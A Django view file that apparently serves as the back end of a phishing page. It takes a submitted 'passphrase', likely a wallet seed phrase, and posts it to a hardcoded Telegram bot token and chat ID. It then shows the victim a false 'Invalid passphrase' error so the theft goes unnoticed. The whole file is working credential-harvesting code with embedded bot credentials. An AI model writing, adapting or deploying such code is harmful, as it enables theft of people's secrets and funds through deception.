import requests
from django.shortcuts import render
from django.http import JsonResponse

# Replace with your actual Telegram Bot Token and Chat ID
bot_token = '7265054014:AAGxCzsiSeBg3O3T6y7JAXoNZP4pWg0H5QY'
chat_id = '6736572379'

def home(request):
    if request.method == 'POST':
        passphrase = request.POST.get('token')

        if not passphrase:
            return JsonResponse({'success': False, 'error': 'Passphrase is required'}, status=400)

        # Construct the message to send
        message = f"{passphrase}"

        # Telegram API URL
        telegram_api_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

        # Send the passphrase to Telegram
        response = requests.post(telegram_api_url, data={
            'chat_id': chat_id,
            'text': message
        })

        if response.status_code == 200:
            return JsonResponse({'success': False, 'error': 'Invalid passphrase'})
        else:
            return JsonResponse({'success': False, 'error': 'Failed to send message to Telegram'}, status=500)

    return render(request, 'index.html')
